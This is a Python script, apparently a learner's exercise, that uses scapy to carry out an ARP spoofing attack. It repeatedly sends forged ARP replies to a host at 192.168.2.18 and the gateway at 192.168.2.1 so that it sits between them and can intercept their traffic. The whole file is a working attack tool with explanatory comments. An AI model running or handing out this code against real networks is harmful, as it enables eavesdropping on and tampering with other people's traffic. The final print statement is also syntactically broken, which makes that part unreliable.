import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")#ff:ff:ff:ff:ff:ff is the broadcast MAC add    ress(None)
    arp_request_broadcast = broadcast/arp_request#combine them together
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]#srp -> sent n recieve packag    e with a custom ether part, return two list with answered(index 0) and unanwered response

    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)#op = 1 request =2 response
    scapy.send(packet, verbose=False)#do not print sent 1 package
    
sent_packets_count = 0
#in case the program crashed in the middle of execution, we use Exceptions handling
try:
    while True:
        spoof("192.168.2.18", "192.168.2.1")
        spoof("192.168.2.1", "192.168.2.18")
        #print("[+] Send two packets")
        sent_packets_count += 2 
        #print("[+] Packets sent:" + str(sent_packets_count)),#print at the same line in the buffer -> will be printed until program quit(not work here? becasue it is just work in python2)
        #sys.stdout.flush()#print instantly
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")#end="" is the way to print in the same line in python3, \r mean print at start of the line
        sys.stdout.flush()
        time.sleep(2)#pause 2 seconds
except KeyboardInterrupt:
    print()
    print([+] Detected CTRL + C ...... Quitting.")
